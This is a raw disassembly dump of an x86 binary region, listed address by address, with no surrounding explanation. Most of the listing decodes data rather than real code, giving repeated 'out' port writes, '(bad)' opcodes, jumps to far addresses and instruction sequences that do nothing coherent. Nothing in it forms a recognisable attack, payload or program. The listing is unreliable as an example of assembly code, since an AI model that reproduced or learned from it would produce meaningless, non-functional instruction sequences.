  448b5d:	stc    
  448b5e:	mov    dl,0x9e
  448b60:	ss inc eax
  448b62:	or     eax,0xd403693
  448b67:	sub    ebp,edi
  448b69:	dec    DWORD PTR ds:0x92f927d2
  448b6f:	sub    al,0x32
  448b71:	inc    eax
  448b72:	or     eax,0xd403269
  448b77:	sub    ebp,edi
  448b79:	dec    DWORD PTR ds:0x2aec845c
  448b7f:	mov    al,ds:0x7abf4f19
  448b84:	adc    eax,0xfd28fd80
  448b89:	pop    edi
  448b8a:	cld    
  448b8b:	sub    ch,bh
  448b8d:	pop    ebx
	...
  448baa:	add    BYTE PTR [eax],al
  448bac:	cld    
  448bad:	sub    ch,bh
  448baf:	push   edi
  448bb0:	sbb    al,0x29
  448bb2:	std    
  448bb3:	push   ebx
  448bb4:	sbb    al,0x29
  448bb6:	std    
  448bb7:	arpl   WORD PTR [ecx+ebp*1],bx
  448bba:	std    
  448bbb:	fwait
  448bbc:	sbb    al,0x29
  448bbe:	std    
  448bbf:	xchg   esp,edi
  448bc1:	sub    ch,bh
  448bc3:	cmp    esp,0x28
  448bc6:	std    
  448bc7:	aas    
  448bc8:	cld    
  448bc9:	sub    ch,bh
  448bcb:	cmp    edi,esp
  448bcd:	sub    ch,bh
  448bcf:	aaa    
  448bd0:	sbb    al,0x0
  448bd2:	out    0x3,eax
  448bd4:	cmp    edi,ebp
  448bd6:	out    0x3,al
  448bd8:	push   ecx
  448bd9:	out    dx,eax
  448bda:	out    0x3,al
  448bdc:	jno    0x448bcd
  448bde:	out    0x3,al
  448be0:	jne    0x448bd1
  448be2:	out    0x3,al
  448be4:	sbb    dh,dh
  448be6:	out    0x3,al
  448be8:	sub    eax,0xf103e6ef
  448bed:	out    dx,al
  448bee:	out    0x3,al
  448bf0:	and    eax,0x1903e6ef
  448bf5:	out    dx,eax
  448bf6:	out    0x3,al
  448bf8:	icebp  
  448bf9:	out    dx,al
  448bfa:	out    0x3,al
  448bfc:	push   ecx
  448bfd:	out    dx,eax
  448bfe:	out    0x3,al
  448c00:	push   ebp
  448c01:	out    dx,eax
  448c02:	out    0x3,al
  448c04:	dec    ecx
  448c05:	out    dx,eax
  448c06:	out    0x3,al
  448c08:	or     eax,0x9103e6ef
  448c0d:	lock out 0x3,al
	...
  448c2c:	add    BYTE PTR [eax],al
  448c2e:	test   eax,esi
  448c30:	out    0x3,al
  448c32:	jns    0x448c24
  448c34:	out    0x3,al
  448c36:	adc    edi,ebp
  448c38:	out    0x3,al
  448c3a:	xor    edi,ebp
  448c3c:	out    0x3,al
  448c3e:	xor    eax,0x2903e6ef
  448c43:	out    dx,eax
  448c44:	out    0x3,al
  448c46:	ins    DWORD PTR es:[edi],dx
  448c47:	lock out 0x3,al
  448c4a:	xor    eax,esi
  448c4c:	out    0x3,al
  448c4e:	gs lock out 0x3,al
  448c52:	pop    ecx
  448c53:	lock out 0x3,al
  448c56:	xor    eax,esi
  448c58:	out    0x3,al
  448c5a:	adc    edi,ebp
  448c5c:	out    0x3,al
  448c5e:	outs   dx,DWORD PTR ds:[esi]
  448c5f:	out    dx,eax
  448c60:	out    0x3,al
  448c62:	or     edi,ebp
  448c64:	out    0x3,al
  448c66:	dec    ebp
  448c67:	lock (bad) 
  448c69:	call   0xe954e87c
  448c6e:	push   cs
  448c6f:	pop    eax
  448c70:	adc    cl,ch
  448c72:	push   cs
  448c73:	push   esp
  448c74:	adc    cl,ch
  448c76:	push   cs
  448c77:	inc    esp
  448c78:	adc    cl,ch
  448c7a:	push   cs
  448c7b:	sbb    al,0x10
  448c7d:	jmp    0xe9540a90
  448c82:	push   cs
  448c83:	and    al,0x10
  448c85:	jmp    0xe954ec98
  448c8a:	push   cs
  448c8b:	jl     0x448c9d
  448c8d:	jmp    0xe95504a0
	...
  448cae:	add    BYTE PTR [eax],al
  448cb0:	push   cs
  448cb1:	je     0x448cc3
  448cb3:	jmp    0xe954f0c6
  448cb8:	push   cs
  448cb9:	cmp    al,0x10
  448cbb:	jmp    0xe9532ace
  448cc0:	push   cs
  448cc1:	inc    esp
  448cc2:	adc    cl,ch
  448cc4:	push   cs
  448cc5:	adc    BYTE PTR [eax],0xe9
  448cc8:	push   cs
  448cc9:	pushf  
  448cca:	psubsw mm1,QWORD PTR [esi]
  448ccd:	cwde   
  448cce:	psubsw mm1,QWORD PTR [esi]
  448cd1:	xchg   esp,eax
  448cd2:	psubsw mm1,QWORD PTR [esi]
  448cd5:	test   BYTE PTR [eax],dl
  448cd7:	jmp    0xe954e8ea
  448cdc:	push   cs
  448cdd:	mov    esi,0x640ee90e
  448ce2:	adc    cl,ch
  448ce4:	push   cs
  448ce5:	lock push cs
  448ce7:	jmp    0xe95398fa
  448cec:	push   cs
  448ced:	or     BYTE PTR [edi],cl
  448cef:	jmp    0xe9539102
  448cf4:	push   cs
  448cf5:	add    BYTE PTR [edi],cl
  448cf7:	jmp    0xe954a90a
  448cfc:	push   cs
  448cfd:	sbb    BYTE PTR [eax],dl
  448cff:	add    BYTE PTR [esp+edi*8],dh
  448d02:	repz adc BYTE PTR [esp+edi*8],ah
  448d06:	ret    
  448d07:	adc    BYTE PTR [esp+edi*8],ah
  448d0a:	mov    edi,0xbc03f410
  448d0f:	adc    ah,dh
  448d11:	add    edi,DWORD PTR [eax+0x10]
	...
  448d2f:	add    BYTE PTR [eax],al
  448d31:	add    ah,ah
  448d33:	add    esi,DWORD PTR [eax+edx*1+0x10b003e4]
  448d3a:	hlt    
  448d3b:	add    ebp,DWORD PTR [eax+edx*1+0x10a803f4]
  448d42:	in     al,0x3
  448d44:	xor    BYTE PTR [eax],dl
  448d46:	in     al,0x3
  448d48:	sub    al,0x10
  448d4a:	mov    ah,0x3
  448d4c:	sub    BYTE PTR [eax],dl
  448d4e:	mov    ah,0x3
  448d50:	and    al,0x10
  448d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448d53:	add    esp,DWORD PTR [eax]
  448d55:	adc    BYTE PTR [ebx+eax*1+0x3b4101c],ah
  448d5c:	sbb    BYTE PTR [eax],dl
  448d5e:	mov    ah,0x3
  448d60:	adc    al,0x10
  448d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448d63:	add    edx,DWORD PTR [eax]
  448d65:	adc    BYTE PTR [ebx+eax*1+0x374100c],ah
  448d6c:	or     BYTE PTR [eax],dl
  448d6e:	je     0x448d73
  448d70:	add    al,0x10
  448d72:	add    eax,DWORD PTR fs:[eax]
  448d75:	adc    BYTE PTR [ebx+eax*1-0x4],ah
  448d79:	pcmpeqb mm0,QWORD PTR [ebx]
  448d7c:	clc    
  448d7d:	pcmpeqb mm0,QWORD PTR [ebx]
  448d80:	hlt    
  448d81:	pcmpgtb mm0,QWORD PTR [ebx]
  448d84:	lock pcmpgtb mm0,QWORD PTR [ebx]
  448d88:	in     al,dx
  448d89:	sysenter 
  448d8b:	add    eax,DWORD PTR [esi]
  448d8d:	adc    DWORD PTR [ebx+eax*1],esi
  448d90:	aam    0xf
  448d92:	and    al,0x3
  448d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448d95:	adc    BYTE PTR [eax],al
	...
  448db3:	add    BYTE PTR ds:0xfda5fd29,cl
  448db9:	sub    ch,bh
  448dbb:	mov    eax,0xebfd28fa
  448dc0:	add    ch,BYTE PTR [ecx]
  448dc2:	std    
  448dc3:	(bad)  
  448dc4:	cld    
  448dc5:	sub    ch,bh
  448dc7:	mov    ds:0xcbfd291c,eax
  448dcc:	adc    ch,BYTE PTR [ecx]
  448dce:	std    
  448dcf:	sub    BYTE PTR ds:0x2bffd29,bl
  448dd5:	sub    ebp,edi
  448dd7:	mov    ebx,0xb7fd291a
  448ddc:	adc    ch,BYTE PTR [ecx]
  448dde:	std    
  448ddf:	mov    bl,0xa
  448de1:	sub    ebp,edi
  448de3:	mov    bl,0x2
  448de5:	sub    ebp,edi
  448de7:	scas   eax,DWORD PTR es:[edi]
  448de8:	sbb    ch,BYTE PTR [ecx]
  448dea:	std    
  448deb:	stos   DWORD PTR es:[edi],eax
  448dec:	adc    ch,BYTE PTR [ecx]
  448dee:	std    
  448def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448df0:	or     ch,BYTE PTR [ecx]
  448df2:	std    
  448df3:	mov    ds:0x9ffd2902,eax
  448df8:	sbb    ch,BYTE PTR [ecx]
  448dfa:	std    
  448dfb:	fwait
  448dfc:	adc    ch,BYTE PTR [ecx]
  448dfe:	std    
  448dff:	xchg   edi,eax
  448e00:	or     ch,BYTE PTR [ecx]
  448e02:	std    
  448e03:	xchg   ebx,eax
  448e04:	add    ch,BYTE PTR [ecx]
  448e06:	std    
  448e07:	(bad)  
  448e08:	sbb    ch,BYTE PTR [ecx]
  448e0a:	std    
  448e0b:	mov    edx,DWORD PTR [edx]
  448e0d:	sub    ebp,edi
  448e0f:	xchg   DWORD PTR [edx],ecx
  448e11:	sub    ebp,edi
  448e13:	add    DWORD PTR [edx],0x29
  448e16:	std    
  448e17:	jg     0x448e19
	...
  448e35:	add    BYTE PTR [edx],bl
  448e37:	sub    ebp,edi
  448e39:	jnp    0x448e4d
  448e3b:	sub    ebp,edi
  448e3d:	ja     0x448e49
  448e3f:	sub    ebp,edi
  448e41:	aam    0x2
  448e43:	sub    ebp,edi
  448e45:	loope  0x448e63
  448e47:	sub    ebp,edi
  448e49:	retf   
  448e4a:	sbb    al,0x0
  448e4c:	out    0x3,eax
  448e4e:	inc    esp
  448e4f:	push   es
  448e50:	out    0x3,eax
  448e52:	fld    QWORD PTR [esi]
  448e54:	out    0x3,eax
  448e56:	fld    DWORD PTR [esi]
  448e58:	out    0x3,eax
  448e5a:	aad    0x6
  448e5c:	out    0x3,eax
  448e5e:	rol    DWORD PTR [esi],1
  448e60:	out    0x3,eax
  448e62:	int    0x6
  448e64:	out    0x3,eax
  448e66:	dec    ecx
  448e67:	add    eax,0x54503e7
  448e6c:	out    0x3,eax
  448e6e:	inc    ecx
  448e6f:	add    eax,0x53d03e7
  448e74:	out    0x3,eax
  448e76:	cmp    DWORD PTR ds:0x53503e7,eax
  448e7c:	out    0x3,eax
  448e7e:	inc    edi
  448e7f:	out    dx,eax
  448e80:	out    0x3,al
  448e82:	sbb    eax,0xf903e705
  448e87:	add    al,0xe7
  448e89:	add    esi,ebp
  448e8b:	add    al,0xe7
  448e8d:	add    esi,ecx
  448e8f:	add    al,0xe7
  448e91:	add    ebp,ebp
  448e93:	add    al,0xe7
  448e95:	add    ecx,DWORD PTR [ecx]
  448e97:	add    eax,0x3e7
	...
  448eb8:	add    eax,0x103e705
  448ebd:	add    eax,0x4fd03e7
  448ec2:	out    0x3,eax
  448ec4:	sbb    DWORD PTR ds:0xf0c003e7,eax
  448eca:	out    0x3,al
  448ecc:	adc    DWORD PTR ds:0x50d03e7,eax
  448ed2:	out    0x3,eax
  448ed4:	imul   eax,DWORD PTR [esi],0x66503e7
  448eda:	out    0x3,eax
  448edc:	popa   
  448edd:	push   es
  448ede:	out    0x3,eax
  448ee0:	leave  
  448ee1:	out    dx,eax
  448ee2:	(bad)  
  448ee3:	call   0xe9543ef6
  448ee8:	push   cs
  448ee9:	aam    0xf
  448eeb:	jmp    0xe95456fe
  448ef0:	push   cs
  448ef1:	and    BYTE PTR [edx],cl
  448ef3:	jmp    0xe94ec306
  448ef8:	push   cs
  448ef9:	cmp    BYTE PTR [edx],cl
  448efb:	jmp    0xe94ebb0e
  448f00:	push   cs
  448f01:	sub    al,0xa
  448f03:	jmp    0xe94d9316
  448f08:	push   cs
  448f09:	dec    eax
  448f0a:	or     ch,cl
  448f0c:	push   cs
  448f0d:	cmp    al,0xa
  448f0f:	jmp    0xe94ecf22
  448f14:	push   cs
  448f15:	push   esp
  448f16:	or     ch,cl
  448f18:	push   cs
  448f19:	pop    eax
  448f1a:	or     ch,cl
	...
  448f38:	add    BYTE PTR [eax],al
  448f3a:	push   cs
  448f3b:	dec    esp
  448f3c:	or     ch,cl
  448f3e:	push   cs
  448f3f:	dec    esp
  448f40:	or     ch,cl
  448f42:	push   cs
  448f43:	push   eax
  448f44:	or     ch,cl
  448f46:	push   cs
  448f47:	fs or  ch,cl
  448f4a:	push   cs
  448f4b:	push   0x5c0ee90a
  448f50:	or     ch,cl
  448f52:	push   cs
  448f53:	pusha  
  448f54:	or     ch,cl
  448f56:	push   cs
  448f57:	je     0x448f63
  448f59:	jmp    0xe94f076c
  448f5e:	push   cs
  448f5f:	and    BYTE PTR [edx],cl
  448f61:	jmp    0xe94ec374
  448f66:	push   cs
  448f67:	cmp    BYTE PTR [edx],cl
  448f69:	jmp    0xe94ebb7c
  448f6e:	push   cs
  448f6f:	xor    BYTE PTR [edx],cl
  448f71:	jmp    0xe94ed384
  448f76:	push   cs
  448f77:	dec    eax
  448f78:	or     al,BYTE PTR [eax]
  448f7a:	fs add ah,al
  448f7d:	push   cs
  448f7e:	fs add bl,dl
  448f81:	push   cs
  448f82:	xor    al,0x0
  448f84:	iret   
  448f85:	push   cs
  448f86:	xor    al,0x0
  448f88:	scas   eax,DWORD PTR es:[edi]
  448f89:	(bad)  
  448f8b:	add    BYTE PTR [esi+ecx*1+0x24],ah
  448f8f:	add    BYTE PTR [esi+0xf],bh
  448f92:	xor    al,0x0
  448f94:	jp     0x448fa5
  448f96:	xor    al,0x0
  448f98:	mov    ebx,0x3d00240e
  448f9d:	sldt   WORD PTR [eax]
	...
  448fbc:	and    al,0x0
  448fbe:	ins    BYTE PTR es:[edi],dx
  448fbf:	pmuludq mm7,mm7
  448fc2:	dec    ebx
  448fc3:	push   cs
  448fc4:	hlt    
  448fc5:	dec    DWORD PTR [esi+0x43ffe40f]
  448fcb:	push   cs
  448fcc:	in     al,0xff
  448fce:	aas    
  448fcf:	push   cs
  448fd0:	hlt    
  448fd1:	(bad)  
  448fd2:	aas    
  448fd3:	push   cs
  448fd4:	hlt    
  448fd5:	jmp    DWORD PTR [edi+0xe]
  448fd8:	in     al,0xff
  448fda:	xor    ecx,DWORD PTR [esi]
  448fdc:	in     al,0xff
  448fde:	pop    ds
  448fdf:	push   cs
  448fe0:	mov    ah,0xff
  448fe2:	sbb    ecx,DWORD PTR [esi]
  448fe4:	mov    ah,0xff
  448fe6:	pop    ss
  448fe7:	push   cs
  448fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448fe9:	call   DWORD PTR [ebx]
  448feb:	push   cs
  448fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448fed:	jmp    DWORD PTR [edx]
  448fef:	(bad)  
  448ff1:	call   FWORD PTR [esi]
  448ff3:	(bad)  
  448ff5:	call   DWORD PTR [edi]
  448ff7:	push   cs
  448ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448ff9:	call   DWORD PTR [ebx]
  448ffb:	push   cs
  448ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448ffd:	inc    DWORD PTR [ecx-0x44008be9]
  449003:	pop    ss
  449004:	je     0x449005
  449006:	dec    eax
  449007:	sbb    BYTE PTR [edi+edi*8-0x5a],ah
  44900b:	sbb    BYTE PTR [edi+edi*8+0x21],ah
  44900f:	sbb    DWORD PTR ds:0x477fd29,ecx
  449015:	sub    ebp,edi
  449017:	fxtract 
  449019:	sub    ch,bh
  44901b:	imul   DWORD PTR cs:[eax]
  44901e:	std    
  44901f:	repz add BYTE PTR [eax],al
	...
  44903e:	sbb    BYTE PTR [ecx],ch
  449040:	std    
  449041:	out    dx,eax
  449042:	adc    BYTE PTR [ecx],ch
  449044:	std    
  449045:	jmp    0x44904f
  449047:	sub    ebp,edi
  449049:	out    0x0,eax
  44904b:	sub    ebp,edi
  44904d:	jecxz  0x449067
  44904f:	sub    ebp,edi
  449051:	fist   WORD PTR [eax]
  449053:	sub    ebp,edi
  449055:	fisttp DWORD PTR [eax]
  449057:	sub    ebp,edi
  449059:	xlat   BYTE PTR ds:[ebx]
  44905a:	add    BYTE PTR [ecx],ch
  44905c:	std    
  44905d:	bndstx [ecx],(bad)
  449060:	std    
  449061:	or     edx,DWORD PTR [ebx]
  449063:	sub    ebp,edi
  449065:	ror    DWORD PTR [edx],0x29
  449068:	std    
  449069:	mov    DWORD PTR [eax],0x18bffd29
  44906f:	sub    ebp,edi
  449071:	mov    ebx,0xb7fd2910
  449076:	or     BYTE PTR [ecx],ch
  449078:	std    
  449079:	mov    bl,0x0
  44907b:	sub    ebp,edi
  44907d:	jns    0x44909a
  44907f:	sub    ebp,edi
  449081:	stos   DWORD PTR es:[edi],eax
  449082:	adc    BYTE PTR [ecx],ch
  449084:	std    
  449085:	in     al,dx
  449086:	and    BYTE PTR [ecx],ch
  449088:	std    
  449089:	xor    DWORD PTR [ebx],ebx
  44908b:	sub    ebp,edi
  44908d:	lahf   
  44908e:	sbb    BYTE PTR [ecx],ch
  449090:	std    
  449091:	fwait
  449092:	adc    BYTE PTR [ecx],ch
  449094:	std    
  449095:	sub    edi,ebp
  449097:	sub    ch,bh
  449099:	push   ebp
  44909a:	std    
  44909b:	sub    ch,bh
  44909d:	(bad)  
  44909e:	sbb    BYTE PTR [ecx],ch
  4490a0:	std    
  4490a1:	mov    eax,DWORD PTR [eax]
	...
  4490bf:	add    BYTE PTR [eax],dl
  4490c1:	sub    ebp,edi
  4490c3:	xchg   DWORD PTR [eax],ecx
  4490c5:	add    bh,ah
  4490c7:	add    ecx,DWORD PTR [ecx-0x72fc18fc]
  4490cd:	add    al,0xe7
  4490cf:	add    esp,ecx
  4490d1:	add    al,0xe7
  4490d3:	add    esp,DWORD PTR [ebp+0x4e03e6ef]
  4490d9:	out    dx,eax
  4490da:	out    0x3,al
  4490dc:	imul   ebp,edi,0xffffffe6
  4490df:	add    eax,DWORD PTR [edi+ebp*8-0x1a]
  4490e3:	add    edx,ebp
  4490e5:	add    al,0xe7
  4490e7:	add    ebx,ecx
  4490e9:	add    al,0xe7
  4490eb:	add    esp,DWORD PTR [edi+0x2]
  4490ee:	out    0x3,eax
  4490f0:	rol    DWORD PTR [edi+eiz*8],0x3
  4490f4:	mov    ch,0x4
  4490f6:	out    0x3,eax
  4490f8:	mov    ecx,0x5d03e704
  4490fd:	add    esp,edi
  4490ff:	add    edx,DWORD PTR [ecx+0x3]
  449102:	out    0x3,eax
  449104:	scas   eax,DWORD PTR es:[edi]
  449105:	add    edi,esp
  449107:	add    ecx,DWORD PTR [ecx+0x3]
  44910a:	out    0x3,eax
  44910c:	xchg   DWORD PTR [ecx],eax
  44910e:	out    0x3,eax
  449110:	xor    DWORD PTR [ebx],eax
  449112:	out    0x3,eax
  449114:	adc    eax,0x8303e703
  449119:	add    edi,esp
  44911b:	add    ebp,ebp
  44911d:	add    ah,bh
  44911f:	add    esp,DWORD PTR [ecx]
  449121:	add    esp,edi
  449123:	add    eax,DWORD PTR [eax]
	...
  449141:	add    BYTE PTR ds:0x1903e703,dl
  449147:	add    esp,edi
  449149:	add    edi,ebp
  44914b:	add    ah,bh
  44914d:	add    edx,DWORD PTR [ecx]
  44914f:	add    esp,edi
  449151:	add    eax,DWORD PTR ds:0x903e703
  449157:	add    esp,edi
  449159:	add    ecx,DWORD PTR [esi+0xee8ffec]
  44915f:	adc    al,0xc
  449161:	jmp    0xe950a974
  449166:	push   cs
  449167:	or     al,0xc
  449169:	jmp    0xe950a17c
  44916e:	push   cs
  44916f:	and    al,0xc
  449171:	jmp    0xe950b984
  449176:	push   cs
  449177:	sbb    al,0xc
  449179:	jmp    0xe94e798c
  44917e:	push   cs
  44917f:	fmul   QWORD PTR [ecx]
  449181:	jmp    0xe94e7194
  449186:	push   cs
  449187:	hlt    
  449188:	or     ecx,ebp
  44918a:	push   cs
  44918b:	(bad)  
  44918c:	or     cl,ch
  44918e:	push   cs
  44918f:	retf   0xe908
  449192:	push   cs
  449193:	into   
  449194:	or     cl,ch
  449196:	push   cs
  449197:	loop   0x4491a1
  449199:	jmp    0xe950d1ac
  44919e:	push   cs
  44919f:	push   esp
  4491a0:	or     al,0xe9
  4491a2:	push   cs
  4491a3:	pop    eax
  4491a4:	or     al,0xe9
	...
  4491c2:	add    BYTE PTR [eax],al
  4491c4:	push   cs
  4491c5:	dec    esp
  4491c6:	or     al,0xe9
  4491c8:	push   cs
  4491c9:	push   eax
  4491ca:	or     al,0xe9
  4491cc:	push   cs
  4491cd:	fs or  al,0xe9
  4491d0:	push   cs
  4491d1:	push   0x5c0ee90c
  4491d6:	or     al,0xe9
  4491d8:	push   cs
  4491d9:	push   eax
  4491da:	or     al,0xe9
  4491dc:	push   cs
  4491dd:	fs or  al,0xe9
  4491e0:	push   cs
  4491e1:	push   0x5c0ee90c
  4491e6:	or     al,0xe9
  4491e8:	push   cs
  4491e9:	pusha  
  4491ea:	or     al,0xe9
  4491ec:	push   cs
  4491ed:	je     0x4491fb
  4491ef:	jmp    0x4ea002
  4491f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4491f5:	cld    
  4491f6:	jmp    0xbc410609
  4491fb:	adc    eax,0xee1fc74
  449200:	fs cld 
  449202:	rcl    BYTE PTR ds:0xed9fc64,cl
  449208:	je     0x449206
  44920a:	aad    0xe
  44920c:	je     0x44920a
  44920e:	ror    DWORD PTR [esi],1
  449210:	fs cld 
  449212:	int    0xe
  449214:	fs cld 
  449216:	leave  
  449217:	push   cs
  449218:	xor    al,0xfc
  44921a:	pop    edi
  44921b:	or     al,0x34
  44921d:	cld    
  44921e:	pop    ebx
  44921f:	or     al,0x24
  449221:	cld    
  449222:	push   edi
  449223:	or     al,0x24
  449225:	cld    
  449226:	push   ebx
  449227:	or     al,0x0
	...
  449245:	add    BYTE PTR [esp+edi*8],dh
  449248:	dec    edi
  449249:	or     al,0x34
  44924b:	cld    
  44924c:	dec    ebx
  44924d:	or     al,0x24
  44924f:	cld    
  449250:	inc    edi
  449251:	or     al,0x24
  449253:	cld    
  449254:	inc    ebx
  449255:	or     al,0xf4
  449257:	add    eax,DWORD PTR [eax+0xc]
  44925a:	hlt    
  44925b:	add    edi,DWORD PTR [esp+ecx*1]
  44925e:	in     al,0x3
  449260:	cmp    BYTE PTR [esp+eiz*8],cl
  449263:	add    esi,DWORD PTR [esp+ecx*1]
  449266:	hlt    
  449267:	add    esi,DWORD PTR [eax]
  449269:	or     al,0xf4
  44926b:	add    ebp,DWORD PTR [esp+ecx*1]
  44926e:	in     al,0x3
  449270:	sub    BYTE PTR [esp+eiz*8],cl
  449273:	add    esp,DWORD PTR [esp+ecx*1]
  449276:	mov    ah,0x3
  449278:	and    BYTE PTR [esp+esi*4],cl
  44927b:	add    ebx,DWORD PTR [esp+ecx*1]
  44927e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44927f:	add    ebx,DWORD PTR [eax]
  449281:	or     al,0xa4
  449283:	add    edx,DWORD PTR [esp+ecx*1]
  449286:	mov    ah,0x3
  449288:	adc    BYTE PTR [ecx*1+0x90bfd19],cl
  44928f:	sbb    ebp,edi
  449291:	pop    es
  449292:	add    DWORD PTR [ecx],ebx
  449294:	std    
  449295:	add    ebx,DWORD PTR [ecx]
  449297:	sbb    ebp,edi
  449299:	call   DWORD PTR [ecx]
  44929b:	sbb    ebp,edi
  44929d:	sti    
  44929e:	push   es
  44929f:	sbb    ebp,edi
  4492a1:	test   DWORD PTR [esi],0x16f3fd19
  4492a7:	sbb    ebp,edi
  4492a9:	out    dx,eax
	...
  4492c6:	add    BYTE PTR [eax],al
  4492c8:	push   ss
  4492c9:	sbb    ebp,edi
  4492cb:	jmp    0x4492d3
  4492cd:	sbb    ebp,edi
  4492cf:	out    0x6,eax
  4492d1:	sbb    ebp,edi
  4492d3:	jecxz  0x4492eb
  4492d5:	sbb    ebp,edi
  4492d7:	fist   WORD PTR [esi]
  4492d9:	sbb    ebp,edi
  4492db:	fild   DWORD PTR [esi]
  4492dd:	sbb    ebp,edi
  4492df:	xlat   BYTE PTR ds:[ebx]
  4492e0:	push   es
  4492e1:	sbb    ebp,edi
  4492e3:	rcl    DWORD PTR [esi],cl
  4492e5:	sbb    ebp,edi
  4492e7:	iret   
  4492e8:	push   ss
  4492e9:	sbb    ebp,edi
  4492eb:	retf   
  4492ec:	push   es
  4492ed:	sbb    ebp,edi
  4492ef:	mov    DWORD PTR [esi],0x16c3fd19
  4492f5:	sbb    ebp,edi
  4492f7:	mov    edi,0xbbfd1916
  4492fc:	push   es
  4492fd:	sbb    ebp,edi
  4492ff:	mov    bh,0x6
  449301:	sbb    ebp,edi
  449303:	mov    bl,0x16
  449305:	sbb    ebp,edi
  449307:	(bad)  
  449308:	push   ss
  449309:	sbb    ebp,edi
  44930b:	ret    0x1906
  44930e:	std    
  44930f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449310:	push   es
  449311:	sbb    ebp,edi
  449313:	mov    ds:0x9ffd1916,eax
  449318:	push   ss
  449319:	sbb    ebp,edi
  44931b:	mov    DWORD PTR ds:0x1c12fd19,ebx
  449321:	add    bh,ah
  449323:	add    ecx,DWORD PTR [ecx+0x7d03e6f0]
  449329:	cli    
  44932a:	out    0x3,al
	...
  449348:	add    BYTE PTR [eax],al
  44934a:	mov    edx,edi
  44934c:	out    0x3,al
  44934e:	test   edx,edi
  449350:	out    0x3,al
  449352:	mov    eax,ds:0x8d03e6fa
  449357:	cli    
  449358:	out    0x3,al
  44935a:	stc    
  44935b:	cli    
  44935c:	out    0x3,al
  44935e:	outs   dx,DWORD PTR ds:[esi]
  44935f:	cld    
  449360:	out    0x3,al
  449362:	dec    ebx
  449363:	cld    
  449364:	out    0x3,al
  449366:	(bad)  
  449368:	out    0x3,al
  44936a:	jmp    0xe5487a69
  44936f:	cli    
  449370:	out    0x3,al
  449372:	mov    cl,0xfa
  449374:	out    0x3,al
  449376:	jge    0x449372
  449378:	out    0x3,al
  44937a:	imul   edi,edx,0xfb8a03e6
  449380:	out    0x3,al
  449382:	mov    ?,ebx
  449384:	out    0x3,al
  449386:	mov    ds:0x9603e6fb,al
  44938b:	sti    
  44938c:	out    0x3,al
  44938e:	jne    0x44938a
  449390:	out    0x3,al
  449392:	mov    eax,ds:0x9d03e6f9
  449397:	stc    
  449398:	out    0x3,al
  44939a:	mov    ecx,edi
  44939c:	out    0x3,al
  44939e:	test   ecx,edi
  4493a0:	out    0x3,al
  4493a2:	xchg   ecx,eax
  4493a3:	stc    
  4493a4:	out    0x3,al
  4493a6:	(bad)  
  4493a7:	stc    
  4493a8:	out    0x3,al
  4493aa:	pop    ecx
  4493ab:	stc    
  4493ac:	out    0x3,al
	...
  4493ca:	add    BYTE PTR [eax],al
  4493cc:	push   ebp
  4493cd:	stc    
  4493ce:	out    0x3,al
  4493d0:	inc    ecx
  4493d1:	stc    
  4493d2:	out    0x3,al
  4493d4:	in     eax,dx
  4493d5:	clc    
  4493d6:	(bad)  
  4493d7:	call   0xe9497fea
  4493dc:	push   cs
  4493dd:	call   0xf4537ce6
  4493e2:	add    al,0xe9
  4493e4:	push   cs
  4493e5:	lock add al,0xe9
  4493e8:	push   cs
  4493e9:	cld    
  4493ea:	add    al,0xe9
  4493ec:	push   cs
  4493ed:	clc    
  4493ee:	add    al,0xe9
  4493f0:	push   cs
  4493f1:	add    al,0x5
  4493f3:	jmp    0xe9499406
  4493f8:	push   cs
  4493f9:	or     al,0x6
  4493fb:	jmp    0xe94a9c0e
  449400:	push   cs
  449401:	adc    al,0x6
  449403:	jmp    0xe94aa416
  449408:	push   cs
  449409:	sbb    al,0x6
  44940b:	jmp    0xe94aac1e
  449410:	push   cs
  449411:	and    al,0x6
  449413:	jmp    0xe94aa426
  449418:	push   cs
  449419:	sbb    al,0x6
  44941b:	jmp    0xe94aac2e
  449420:	push   cs
  449421:	xor    al,0x6
  449423:	jmp    0xe9495736
  449428:	push   cs
  449429:	cmp    al,0x6
  44942b:	jmp    0xe94f663e
	...
  44944c:	add    BYTE PTR [eax],al
  44944e:	push   cs
  44944f:	fimul  WORD PTR [edx]
  449451:	jmp    0xe94ac464
  449456:	push   cs
  449457:	cmp    al,0x6
  449459:	jmp    0xe94acc6c
  44945e:	push   cs
  44945f:	push   esp
  449460:	push   es
  449461:	jmp    0xe9497774
  449466:	push   cs
  449467:	pop    esp
  449468:	push   es
  449469:	jmp    0x532c7c
  44946e:	mov    ah,0x0
  449470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449471:	or     dh,BYTE PTR [eax+eax*1+0xa40aa0]
  449478:	pushf  
  449479:	or     ah,BYTE PTR [eax+eax*1+0xb40a98]
  449480:	xchg   esp,eax
  449481:	or     dh,BYTE PTR [eax+eax*1+0xa40a90]
  449488:	mov    WORD PTR [edx],cs
  44948a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44948b:	add    BYTE PTR [eax-0x7bff8bf6],cl
  449491:	or     dh,BYTE PTR [eax+eax*1-0x80]
  449495:	or     ah,BYTE PTR [eax+eax*1-0x74]
  449499:	or     ah,BYTE PTR [eax+eax*1-0x14]
  44949d:	push   cs
  44949e:	je     0x4494a0
  4494a0:	je     0x4494ac
  4494a2:	je     0x4494a4
  4494a4:	jo     0x4494b0
  4494a6:	add    BYTE PTR fs:[edx+ecx*1+0x64],ch
  4494ab:	add    BYTE PTR [eax+0xa],ch
  4494ae:	xor    al,0x0
  4494b0:	or     al,BYTE PTR fs:[eax]
	...
  4494cf:	add    BYTE PTR [eax+eax*1],dh
  4494d2:	pusha  
  4494d3:	or     ah,BYTE PTR [eax+eax*1]
  4494d6:	pop    esp
  4494d7:	or     ah,BYTE PTR [eax+eax*1]
  4494da:	pop    eax
  4494db:	or     dh,BYTE PTR [eax+eax*1]
  4494de:	push   esp
  4494df:	or     dh,BYTE PTR [eax+eax*1]
